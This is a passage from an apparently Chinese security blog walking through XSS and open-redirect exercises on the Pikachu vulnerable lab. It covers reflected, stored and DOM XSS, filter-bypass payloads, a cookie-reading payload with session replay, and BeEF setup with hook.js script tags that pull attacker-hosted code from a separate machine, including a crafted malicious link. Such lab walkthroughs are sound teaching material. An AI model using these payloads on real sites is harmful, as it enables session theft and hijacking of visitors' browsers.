<p>url指定重定向后的网页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>重定向到百度</p>
<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
<p>可以抓个包看看</p>
<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
<p>可以看到302响应包中的location字段指向百度</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-xss</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
    <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
<p>具体来说，XSS攻击有两种类型：存储型XSS和反射型XSS，此外还涉及一种DOM型的XSS。</p>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>指的是将攻击代码存储在网站的数据库中，等待用户访问时自动执行。</p>
<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>指的是将攻击代码作为URL参数的值传递给服务器，服务器将其直接输出到浏览器端，从而在用户的浏览器中执行攻击代码。</p>
<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。与传统的XSS攻击相比，DOM型XSS有一些明显的区别：</p>
<p>1.DOM型XSS不依赖于服务器的输出，因此无需修改服务器端代码来攻击。</p>
<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
<h5 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h5><p>如何辨别一个XSS攻击是否为DOM型XSS呢？下面是几个可以帮助你进行辨别的方法：</p>
<p>1.检查攻击代码是否被服务器端的代码直接输出。如果攻击代码被直接输出，则可能是反射型XSS；如果攻击代码未被直接输出，则可能是DOM型XSS。</p>
<p>2.检查攻击代码是否来自用户的输入。如果攻击代码来自用户的输入，则可能是DOM型XSS；如果攻击代码不是来自用户的输入，则可能是存储型XSS。</p>
<p>3.检查攻击代码是否依赖于浏览器的JavaScript代码执行。如果攻击代码依赖于浏览器的JavaScript代码执行，则可能是DOM型XSS；如果攻击代码不依赖于浏览器的JavaScript代码执行，则可能是存储型XSS。</p>
<h5 id="最基本的payload"><a href="#最基本的payload" class="headerlink" title="最基本的payload"></a>最基本的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>该payload会在浏览器上跳出一个弹窗</p>
<p>xss就是在我们可控的地方放入可解析的代码</p>
<p><img src="/images/1660186046326-4d44628a-58c7-457d-90ed-96f14c503504.png" alt="img"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg">https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg</a></p>
<h1 id="BeEF-XSS利用框架安装"><a href="#BeEF-XSS利用框架安装" class="headerlink" title="BeEF XSS利用框架安装"></a>BeEF XSS利用框架安装</h1><p>攻击机使用的是kali系统(免费，可直接下载)</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>

<p>如果提示无法定位软件包，可以先apt-get update后再尝试</p>
<p>如果还是不行，可手动安装</p>
<p><a href="https://beefproject.com/">https://beefproject.com/</a></p>
<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
<p>下载后可能会报毒，不用在意</p>
<p>放置kali后解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install</span><br></pre></td></tr></table></figure>

<p>如果还不行可能和新旧版本的kali有关系</p>
<p>可在其他linux系统安装，这里使用的是ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./beef</span><br></pre></td></tr></table></figure>

<p>第一次运行需要修改密码</p>
<p><img src="/images/image-20230108165651096.png" alt="image-20230108165651096"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gedit config.yaml</span><br></pre></td></tr></table></figure>

<p>此处更改为自己的用户名密码</p>
<p><img src="/images/image-20230108165800888.png" alt="image-20230108165800888"></p>
<p>然后登录web界面</p>
<p><img src="/images/image-20230108170143782.png" alt="image-20230108170143782"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.28.150:3000/ui/authentication</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png"></p>
<p>登录进入后台，用户名为beef</p>
<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>beef启动时命令行会给出web页面地址和攻击payload</p>
<p>使用脚本安装的可能没有，自己补全即可</p>
<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
<p>payload换上攻击机的ip地址，直接上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
<p>获取访问留言板的电脑的主机信息</p>
<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
<p>同样，换个虚拟机发起请求</p>
<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
<p>攻击机kali获取到主机信息</p>
<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
<p>攻击机获取到主机信息</p>
<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
<h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><p>是一种非持久化的xss，即攻击行为在网页刷新后就不存在了(但如果是get请求需要将payload删除)，攻击行为只会发生在客户端，即浏览器，并不会将攻击代码存储到网站服务器中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;test&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可控点在<div>标签里面</div></p>
<p><img src="/images/1662617312740-0ed9d6ef-f86b-42b1-a38f-1e4bacd65d8f.png" alt="img"></p>
<p>直接插入payload</p>
<p><img src="/images/1662617482276-c28ec953-08dc-4b2a-b974-786779e9b345.png" alt="img"></p>
<p>反射型xss就是把用户输入的数据“反射”给浏览器，也就是说，用户在访问恶意链接时，才能攻击成功，反射型xss也叫做非持久性xss。</p>
<p>反射型xss需要服务端解析响应参与，但输入的payload并不存储在服务器上。</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>可以f12查看可控点</p>
<p><img src="/images/1660476633506-b93b6ac7-2f8c-476c-957e-b738bcea1750.png" alt="img"></p>
<p>xss的验证方法基本上就是拿着payload见框就插</p>
<p>该题首先发现payload压根输不满</p>
<p><img src="/images/1660184936621-b04dfb7b-3a7b-4f43-8402-b665448d06e4.png" alt="img"></p>
<p>这里有多种解决方法。</p>
<p>1.f12直接更改前端代码。</p>
<p>将maxlenth字段删除</p>
<p><img src="/images/1660185365090-0dcdec0a-d027-4b2f-959b-fabf9b5d6230.png" alt="img"></p>
<p><img src="/images/1660185501321-c7b0d245-99a4-4105-b5da-a72d56c0036c.png" alt="img"></p>
<p>2.抓包后修改放包。</p>
<p>抓包后直接修改请求。注意有些情况需要url编码。</p>
<p><img src="/images/1660185676861-9595165b-756c-46cc-afb1-ddf2ead09de2.png" alt="img"></p>
<p>3.因为是get请求，可以直接在地址栏修改</p>
<p><img src="/images/1660185993458-1c631800-176a-4506-a867-489816d8e492.png" alt="img"></p>
<p>成功弹窗</p>
<p><img src="/images/1660185960775-3d08b7c5-6199-44cf-9065-a0c127699488.png" alt="img"></p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post请求即发送的payload并不会显示到url地址栏中，而是放在数据包的body部分</p>
<p><img src="/images/1660186338853-0af903af-6785-46b8-9d4c-5af5fdb84308.png" alt="img"></p>
<p>根据提示考察的是通过xss获取cookie，先登录。</p>
<p>首先alert一个弹窗看看是否存在xss</p>
<p><img src="/images/1660186626342-0cc88d27-f63f-4f2a-9329-c4027d952498.png" alt="img"></p>
<p>可以看出post类型的反射型xss</p>
<p><img src="/images/1660186598976-013e91db-3e38-4995-a190-ae926e8eb50c.png" alt="img"></p>
<p>插入获取cookie的payload</p>
<script>alert(document.cookie)</script>

<h3 id="关于document-cookie"><a href="#关于document-cookie" class="headerlink" title="关于document.cookie"></a>关于document.cookie</h3><p>cookie是用于维持用户登录状态和行为的一个东东，获取到用户的cookie就相当于获取到了用户的用户名和密码。</p>
<p>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</p>
<p>document.cookie可以读取当前cookie</p>
<p><img src="/images/1660187377093-761310f5-2c3c-4592-8546-546236b52087.png" alt="img"></p>
<p>成功获取cookie</p>
<p><img src="/images/1660186806768-2ad9856c-676a-46a2-b34b-e8f8919fd84a.png" alt="img"></p>
<h3 id="cookie利用"><a href="#cookie利用" class="headerlink" title="cookie利用"></a>cookie利用</h3><p>这里可以体会一下cookie的作用</p>
<p>首先抓包保存登录后的后台路径和cookie值</p>
<p><img src="/images/1660188619423-f9acd23a-bf2f-496e-bcac-e579b485d986.png" alt="img"></p>
<p>退出登录，重新对后台路径发起请求，并添加cookie</p>
<p><img src="/images/1660188991267-eb771206-5a58-44f3-99df-fa44d9d722dc.png" alt="img"></p>
<p>成功登录</p>
<p><img src="/images/1660189006511-4813c1c4-9010-4789-8da6-56a049bc66ab.png" alt="img"></p>
<h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><p>持久型跨站点脚本</p>
<p>持久型主要体现在其xss攻击代码会保存至服务器网站数据库中，所以当存储型xss发生时，所有访问受攻击页面的用户都会受到影响。</p>
<p>可以f12查看可控点</p>
<p><img src="/images/1660476725683-a4db4011-7712-44b5-b103-b66429005e53.png" alt="img"></p>
<p>往留言板中插入恶意payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660270330674-45d49425-c4f4-4192-b6be-e8ede2722051.png" alt="img"></p>
<p>出现弹窗</p>
<p><img src="/images/1660270354073-bda7e2e1-c31f-4596-a317-c39de9586345.png" alt="img"></p>
<p>可以发现已经存储到服务器数据库</p>
<p><img src="/images/1660270377285-9b1c3bac-230c-451b-b8bc-165e8fc53a37.png" alt="img"></p>
<p>此时更换一个浏览器再次访问该留言板地址</p>
<p>依然会出现弹窗</p>
<p><img src="/images/1660270428509-83838f57-b9c4-456f-8037-5c5b003c1397.png" alt="img"></p>
<p>存储型xss的危害比反射型xss危害大得多，当服务器被植入存储型xss时，可被用来钓鱼，窃取cookie，用户登录凭证等。</p>
<h2 id="存储型xss利用"><a href="#存储型xss利用" class="headerlink" title="存储型xss利用"></a>存储型xss利用</h2><p>这里可以直观的体现一下存储型xss的作用</p>
<p>攻击机使用的是kali系统(免费，可直接下载)</p>
<p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png" alt="img"></p>
<p>登录进入后台，用户名为beef</p>
<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
<p>启动时命令行会给出web页面地址和攻击payload</p>
<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
<p>payload换上攻击机的ip地址，直接上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.153:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
<p>获取访问留言板的电脑的主机信息</p>
<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
<p>同样，换个虚拟机发起请求</p>
<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
<p>攻击机kali获取到主机信息</p>
<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
<p>攻击机获取到主机信息</p>
<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
<h1 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h1><h2 id="DOM概述"><a href="#DOM概述" class="headerlink" title="DOM概述"></a>DOM概述</h2><p>简单来说，DOM文档就是一份XML文档，当有了DOM标准之后，DOM便将前端html代码化为一个树状结构，方便程序和脚本能够轻松的动态访问和更新这个树状结构的内容、结构以及样式，且不需要经过服务端，所以DOM型xss在js前端自己就可以完成数据的输入输出，不与服务器产生交互，这样来说DOM型xss也可以理解为反射性xss。</p>
<p>DOM XSS与反射性XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。一般不与服务器交互，所以输入的payload也不会存储在服务器上。</p>
<p>但其实质是通过修改页面的DOM节点形成的xss，所以在后面的xss-x中，可以发现与服务器产生了交互，但是由于还是通过修改页面的DOM节点形成的xss，所以也归为dom型xss。</p>
<p>有关DOM的可以参考<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">https://www.runoob.com/htmldom/htmldom-tutorial.html</a></p>
<h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">	var str = document.getElementById(&quot;test&quot;).value;</span><br><span class="line">	document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;test&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码，就是将输入到id&#x3D;test的文本框的文本内容，点击write按钮后，执行test()函数，将输入的文本内容，放到a标签的href中显示到前端（<a href="xxxxxxxxxx">testLink</a>）</p>
<p><img src="/images/1662618457481-02526d36-c474-4b34-930a-88bcc7e994ad.png" alt="img"></p>
<p>随便输入一个hello world，点击write</p>
<p>可以发现源代码中出现一个a标签，href中就是我们输入的内容</p>
<p><img src="/images/1662618556441-26f7763e-33a1-44be-b399-e354008e787d.png" alt="img"></p>
<p>而且可以抓包，当我们点击write时，并不会抓到数据包，仅在前端html中输出</p>
<h3 id="插入payload"><a href="#插入payload" class="headerlink" title="插入payload"></a>插入payload</h3><p>由于可控点在a标签中的href属性，需要先将a标签闭合或使用事件触发</p>
<h5 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>

<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后用注释符“&#x2F;&#x2F;”注释掉单引号。点击新生连接，脚本将被执行。</p>
<p><img src="/images/1662619049036-41394025-6721-467d-9b09-b15fde9a206b.png" alt="img"></p>
<h5 id="闭合a标签"><a href="#闭合a标签" class="headerlink" title="闭合a标签"></a>闭合a标签</h5><p>但使用<script></script>时并不会弹窗</p>
<p>a标签里并不解析<script>标签</p>
<p><img src="/images/1662621427146-b9300938-f2ee-4a3e-a152-fe2c26a4756e.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1662621081022-4933e3f5-efac-4491-900c-af86413897e9.png" alt="img"></p>
<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这段代码实现了一个简单的页面，允许用户输入昵称并在页面上显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DOM XSS Attack Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Please enter your nickname:&lt;/p&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input id=&quot;nickname&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;p&gt;Your nickname is: &lt;span id=&quot;display&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const form = document.querySelector(&#x27;form&#x27;);</span><br><span class="line">        const nicknameInput = document.querySelector(&#x27;#nickname&#x27;);</span><br><span class="line">        const display = document.querySelector(&#x27;#display&#x27;);</span><br><span class="line"></span><br><span class="line">        form.addEventListener(&#x27;submit&#x27;, (event) =&gt; &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line"></span><br><span class="line">            const nickname = nicknameInput.value;</span><br><span class="line">            display.innerHTML = nickname;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>随便输入一串字符</p>
<p><img src="/images/image-20230107224210191.png" alt="image-20230107224210191"></p>
<p>抓包也没有与服务器交互</p>
<p>直接通过前端的js代码将输入框的东西输出到浏览器</p>
<h2 id="普通DOM型xss"><a href="#普通DOM型xss" class="headerlink" title="普通DOM型xss"></a>普通DOM型xss</h2><p><img src="/images/1660291585340-ecdca394-b111-4505-b7b3-f72b0df0f35e.png" alt="img"></p>
<p>由于其将输入的字符放进了html标签中的属性中，所以该类型xss攻击需要将标签闭合，并且加入自己的payload.</p>
<p>即下面的hello我们是可控的。需要通过将a标签闭合，或通过事件触发，再放入自己的恶意payload才可以造成xss</p>
<p><img src="/images/1660291862424-93c60fa9-14f7-4ffd-afa2-c890fdbba430.png" alt="img"></p>
<p>a标签可以接受onclick属性，表示点击行为，点击就触发</p>
<p>所以可以接上onclick=alert('xss')>把a的右标签也闭合了</p>
<p>所以payload为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1660295072228-82da965b-ff25-475a-bd72-5b2f350f3421.png" alt="img"></p>
<p><img src="/images/1660295264667-593a7c3d-8210-4392-bada-e495fbaeac13.png" alt="img"></p>
<p>点击弹窗</p>
<p><img src="/images/1660295272768-f1c011f0-8ce5-48f9-a308-440eef974a84.png" alt="img"></p>
<p>反正只要能凑上闭合，能解析，怎么样都行</p>
<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>上述的dom型xss可以发现，输入的payload，并不与服务器交互，也不显示在url中。</p>
<p><img src="/images/1662622837438-afaae957-f195-46b4-b2df-57311da7e03c.png" alt="img"></p>
<p>dom型xss-x，可以发现url中存在输入的内容，可以将带有恶意payload的url发给被攻击者钓鱼</p>
<p><img src="/images/1662622629801-cb87a0c8-53ea-4fa5-ac4b-adb43578ca1d.png" alt="img"></p>
<p>从源码可以看出，输入到文本框的内容，会先通过get请求将内容发送到服务端</p>
<p><img src="/images/1662623756155-e22ac861-92b7-4ed3-8eae-d1db2cb8d455.png" alt="img"></p>
<p>服务端接收到get请求的内容，调用domxss()函数，通过修改页面的DOM节点形成新的html传回给客户端的浏览器，所以也归为为DOM XSS</p>
<p><img src="/images/1662624234083-f986c7ba-f92f-4f3f-a2f7-ec93690f21bf.png" alt="img"></p>
<p><img src="/images/1662624224148-501c0bca-1a61-49f1-badd-fb029a0f75e0.png" alt="img"></p>
<p>后续利用同DOM型xss</p>
<p>随便输入一串字符串，然后点击按钮，可以看出添加到了<a>标签中</p>
<p><img src="/images/image-20230107233737057.png" alt="image-20230107233737057"></p>
<p>同上题需要凑闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230107235014624.png" alt="image-20230107235014624"></p>
<h2 id="DOM型xss和传统XSS的区别"><a href="#DOM型xss和传统XSS的区别" class="headerlink" title="DOM型xss和传统XSS的区别"></a>DOM型xss和传统XSS的区别</h2><p>DOM型XSS是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。</p>
<p>1.DOM型XSS不依赖于服务器的输出</p>
<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
<p>4.不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom-xss是通过url传入参数去控制触发的。(可以看作是反射型的特殊情况)</p>
<p>与DOM型XSS相比，反射型XSS的区别在于：</p>
<p>1.反射型XSS依赖于服务器的输出</p>
<p>2.反射型XSS攻击的源代码会被服务器端的代码直接输出到浏览器端，然后在浏览器中执行。</p>
<p>3.反射型XSS攻击的攻击范围较小，通常是通过邮件、聊天工具或社交媒体将攻击链接发送给目标用户，让用户自己打开链接进行攻击。</p>
<p>总之，DOM型XSS攻击更加隐蔽，而反射型XSS攻击更容易被发现，但两者都可能对用户造成严重的安全威胁。</p>
<h1 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h1><p><img src="/images/image-20230108191822262.png" alt="image-20230108191822262"></p>
<p>需要绕过过滤</p>
<p>经过尝试，该题过滤的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br></pre></td></tr></table></figure>

<p>当遇到<script时会直接被去除</p>
<p><img src="/images/image-20230108203249590.png" alt="image-20230108203249590"></p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下面会列举几个绕过的方式，要是有其他的方式自行查阅</p>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108212120454.png" alt="image-20230108212120454"></p>
<p>可以看到成功解析为<script>标签</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCrIPT&gt;alert(123)&lt;/sCrIPt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108211941551.png" alt="image-20230108211941551"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>题目可以发现<script会被去除，所以可以用来构造payload</p>
<p>双写绕过原理很简单，可以做个测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scriptWorld</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108213754256.png" alt="image-20230108213754256"></p>
<p>可以看到<script被去掉，剩下来HelloWorld</p>
<p>当过滤规则只替换一次且是替换为空<script时，就可以使用双写绕过</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scri&lt;scriptptWorld</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108220509951.png" alt="image-20230108220509951"></p>
<p>可以看到该题并不能使用简单的双写绕过，需要配合其他绕过方式</p>
<h3 id="各类标签绕过"><a href="#各类标签绕过" class="headerlink" title="各类标签绕过"></a>各类标签绕过</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p>除了<script></script>还可以使用其他的标签进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>该payload表示当img调用src的图片失败，则触发onerror行为，执行alert(123)</p>
<p><img src="/images/image-20230108222853591.png" alt="image-20230108222853591"></p>
<h4 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(`1`)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230108224804638.png" alt="image-20230108224804638"></p>
<h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onclick=alert(123)&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109085110147.png" alt="image-20230109085110147"></p>
<p>点击后触发</p>
<p><img src="/images/image-20230109085127282.png" alt="image-20230109085127282"></p>
